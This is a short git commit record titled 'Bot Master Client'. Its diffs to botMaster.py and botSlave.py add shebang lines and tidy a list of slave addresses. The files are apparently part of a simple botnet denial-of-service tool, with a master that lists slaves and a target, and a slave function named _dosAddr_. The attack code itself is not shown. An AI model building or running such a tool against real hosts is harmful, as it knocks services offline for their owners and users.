2628d2203974839408161d8626189de804b482a6
Mike Romano <romano.michaelj@gmail.com>
2011-03-14 14:58:55 -0400

    Bot Master Client

--- botMaster.py
+++ botMaster.py
@@ -1,6 +1,7 @@
+#!/usr/bin/python
 import socket
 #Put Slave Addresses in addresses array
-addresses=['127.0.0.1','127.0.0.1',]
+addresses=['127.0.0.1','127.0.0.1']
 #Set target to url or IP - ie 127.0.0.1 or www.mysite.org
 target = '127.0.0.1'
 port = 1337
--- botSlave.py
+++ botSlave.py
@@ -1,3 +1,4 @@
+#!/usr/bin/python
 import socket,urllib2
 
 def _dosAddr_(target):
